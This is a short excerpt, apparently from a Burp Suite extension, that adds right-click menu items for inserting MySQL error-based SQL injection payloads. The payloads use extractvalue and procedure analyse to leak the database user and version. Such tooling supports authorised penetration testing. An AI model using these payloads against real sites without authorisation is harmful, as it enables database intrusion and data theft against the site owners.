...
class BurpExtender(IBurpExtender, IContextMenuFactory, IHttpRequestResponse):
    ...
    def createMenuItems(self, invocation):
        ...
        mainMenu.add(JMenuItem("extractvalue(1,concat(0x7e,(select+user()),0x7e))", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("procedure analyse(1,extractvalue(rand(),concat(0x3a,version())))", actionPerformed=self.insertPayloadActionPerformed))
